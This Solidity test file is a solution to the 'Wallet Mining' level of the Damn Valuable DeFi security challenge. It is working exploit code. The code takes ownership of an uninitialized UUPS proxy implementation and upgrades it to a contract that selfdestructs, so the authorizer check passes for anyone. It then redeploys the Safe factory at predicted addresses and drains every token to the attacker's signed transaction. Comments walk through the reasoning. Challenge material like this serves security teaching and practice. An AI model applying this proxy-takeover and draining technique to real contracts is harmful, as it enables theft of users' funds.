// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import { WalletDeployer} from "../../../src/Contracts/wallet-mining/WalletDeployer.sol";
import {AuthorizerUpgradeable} from "../../../src/Contracts/wallet-mining/AuthorizerUpgradeable.sol";

import {GnosisSafe, Enum} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletMining is Test {

    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    address internal constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    AuthorizerUpgradeable internal authorizer;
    WalletDeployer internal walletDeployer;
    uint256 internal initialWalletDeployerTokenBalance;
    address payable internal deployer;
    address payable internal ward;
    address internal player;
    uint256 internal playerPk;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);
        deployer = users[0];
        ward = users[1];
        (player, playerPk) = makeAddrAndKey("player");

        vm.label(deployer, "Deployer");
        vm.label(ward, "Ward");
        vm.label(player, "Player");

        // Deploy Damn Valuable Token contract
        vm.prank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the authorizer using UUPS proxy pattern
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        wards[0] = ward;
        aims[0] = DEPOSIT_ADDRESS;
        vm.prank(deployer);
        address authorizerImp = address(new AuthorizerUpgradeable());
        
        vm.prank(deployer);
        address authorizerAddr = 
            address(new ERC1967Proxy(
                authorizerImp,
                abi.encodeWithSignature("init(address[],address[])", wards, aims)
            ));
        authorizer = AuthorizerUpgradeable(authorizerAddr);
        vm.label(address(authorizer), "Authorizer");
        assertEq(authorizer.owner(), deployer);
        assertTrue(authorizer.can(ward, DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, DEPOSIT_ADDRESS));

        // Deploy the wallet deployer contract
        vm.prank(deployer);
        walletDeployer = new WalletDeployer(address(dvt));
        vm.label(address(walletDeployer), "WalletDeployer");

        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(dvt));

        // Set Authorizer in Safe Deployer
        vm.prank(deployer);
        walletDeployer.rule(address(authorizer));
        assertEq(walletDeployer.mom(), address(authorizer));

        walletDeployer.can(ward, DEPOSIT_ADDRESS);
        // @note The following line shouldn't revert and should only halt (return(0,0) == stop()) execution in case where the return data is wrong. They expect it to fail in the hardhat setup but in the foundry setup it doesnt work as expected. So commenting this line for now.
        // vm.expectRevert();
        // walletDeployer.can(player, DEPOSIT_ADDRESS);
        

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay() * 43;
        vm.prank(deployer);
        dvt.transfer(
            address(walletDeployer),
            initialWalletDeployerTokenBalance
        );
        // Ensure these accounts start empty
        assertEq(DEPOSIT_ADDRESS.code , hex'');
        assertEq(address(walletDeployer.fact()).code,hex'');
        assertEq(walletDeployer.copy().code,hex'');

        // Deposit large amount of DVT tokens to the deposit address
        vm.prank(deployer);
        dvt.transfer(
            DEPOSIT_ADDRESS,
            DEPOSIT_TOKEN_AMOUNT
        );

        // Ensure initial balances are set correctly
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(dvt.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);

        assertEq(dvt.balanceOf(player), 0);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");

        // First thing first, when we look at the AuthorizerUpgradeable contract we noticed a common UUPS issue due to initialized implementation. For more info check https://www.rareskills.io/post/initializable-solidity?.
        // Basically, we can directly call the init function on the implementation contract which would reset us as the owner and then call upgradeToAndCall on our attack contract. Since they have change _authorizeUpgrade modifier from onlyProxy to onlyOwner, this would work. The upgradeToAndCall would call selfdestruct and should empty the implementation contract. 
        // What needs to be known is that a low level call to an empty address works and does not revert. Here's why ? An execution can only revert if it encounters a REVERT opcode, runs out of gas, or attempts something prohibited, such as dividing by zero. However, when a call is made to an empty address, none of the above conditions can occur. So the call works. (Using interface/solidity it checks the contracts code bfore calling so it would revert before). More info : https://www.rareskills.io/post/low-level-call-solidity.
        // This means after calling the function can() of walletDeployer :
        // iszero(staticcall(gas(),m,p,0x44,p,0x20)) will be false
        // and(not(iszero(returndatasize())), iszero(mload(p))) :  returndatasize() is equal to 0 here so not(iszero(returndatasize())) will be false 
        // The function will return true if called with any parameters.
        // We retrieve the implementation address from the proxy storage slots since this is a private variable.
        // We change and destroy the implementation in the setup because selfdestruct only takes effect after the tx has finished.
        vm.startPrank(player);

        Attack attack = new Attack();

        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address implementation = address(uint160(uint256(vm.load(address(authorizer), _IMPLEMENTATION_SLOT))));
        // we create empty arrays as we dont only need to change the owner.
        address[] memory temp;
        address[] memory temp2;
        AuthorizerUpgradeable(implementation).init(temp, temp2);
        AuthorizerUpgradeable(implementation).upgradeToAndCall(address(attack), abi.encodeWithSelector(attack.attack.selector));

        vm.stopPrank();
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.prank(deployer);
        address safeDeployer3 = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;
        dvt.transfer(safeDeployer3, 2 ether);
        address factoryAddress = computeCreateAddress(0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A, 2);
        address masterCopyAddress = computeCreateAddress(0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A, 0);
        assertEq(masterCopyAddress, 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F);
        assertEq(factoryAddress, 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);

        vm.deal(safeDeployer3, 5 ether);
        vm.startPrank(safeDeployer3);
        assertEq(vm.getNonce(safeDeployer3), 0);
        GnosisSafe masterCopy = new GnosisSafe();
        GnosisSafe masterCopy2 = new GnosisSafe();
        assertEq(vm.getNonce(safeDeployer3), 2);

        GnosisSafeProxyFactory proxyFactory = new GnosisSafeProxyFactory();

        vm.stopPrank();

        vm.startPrank(player);
        // console.logBytes(vm.parseJson(vm.readFile("./test/Levels/wallet-mining/data.json"), ".SAFE_PROXY_FACTORY_DEPLOYEMENT_BYTECODE_TX_HASH"));
        // console.log(vm.toString(vm.parseJson(vm.readFile("./test/Levels/wallet-mining/data.json"), ".SAFE_PROXY_FACTORY_DEPLOYEMENT_BYTECODE_TX_HASH")));
        // GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(deployCode(vm.toString(vm.parseJson(vm.readFile("./test/Levels/wallet-mining/data.json"), ".SAFE_PROXY_FACTORY_DEPLOYEMENT_BYTECODE_TX_HASH"))));

        // GnosisSafe masterCopy = GnosisSafe(payable(deployCode(string(vm.parseJson(vm.readFile("./test/Levels/wallet-mining/data.json") ,"SAFE_MASTER_COPY_DEPLOYEMENT_BYTECODE_TX_HASH")))));
        // address(masterCopy).call(vm.parseJson("./test/Levels/wallet-mining/data.json", "SAFE_SET_IMPLEMENTATION_CALLDATA"));

        assertEq(address(proxyFactory), address(walletDeployer.fact()));
        assertEq(address(masterCopy), walletDeployer.copy());
        

        // Exploit exploit = new Exploit();
        address[] memory owners = new address[](1);
        owners[0] = player;
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector, 
            owners, 
            uint256(1), 
            address(0), 
            "", 
            address(0), 
            address(0), 
            0, 
            address(0)
        );
        uint i =0;
        address aim;
        address copy = address(0);
        while(dvt.balanceOf(address(walletDeployer)) > 0){
        // copy = computeCreateAddress(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B, i);
        copy = walletDeployer.drop(initializer);
        if (copy == DEPOSIT_ADDRESS){
            aim = copy;
        }
        i=i+1;
        }

        bytes32 txHash = GnosisSafe(payable(aim)).getTransactionHash(
            address(dvt),
            0,
            abi.encodeWithSignature("transfer(address,uint256)", player, dvt.balanceOf(aim)),
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            address(0),
            0
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, txHash);
        bytes memory signature = abi.encodePacked(r,s,v); 
        assertEq(v, 27);

        bool success = GnosisSafe(payable(aim)).execTransaction(
            address(dvt),
            0,
            abi.encodeWithSignature("transfer(address,uint256)", player, dvt.balanceOf(aim)),
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );
        assertTrue(success);

        // if(copy != DEPOSIT_ADDRESS && i < 50){
        //     copy = computeCreateAddress(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B, i);
        //     address aim = address(proxyFactory.createProxy(address(masterCopy), initializer));
        // }


        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Factory account must have code
        assertTrue(address(walletDeployer.fact()).code.length > 0);

        // Master copy account must have code
        assertTrue(walletDeployer.copy().code.length > 0);

        // Deposit account must have code
        assertTrue(DEPOSIT_ADDRESS.code.length > 0);

        // The deposit address and the WalletDeployer contract must not hold tokens
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(address(walletDeployer)), 0);

        // Player must own all tokens
        assertEq(dvt.balanceOf(player), initialWalletDeployerTokenBalance + DEPOSIT_TOKEN_AMOUNT);
    }
}

// contract Exploit {

//     function callTransferViaDelegate(address player, DamnValuableToken token) external {
//         token.transfer(player,token.balanceOf(address(this)));
//     }

// }

contract Attack {
    address payable immutable player = payable(msg.sender);
    constructor(){
    }

    function attack() external {
        selfdestruct(player);
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}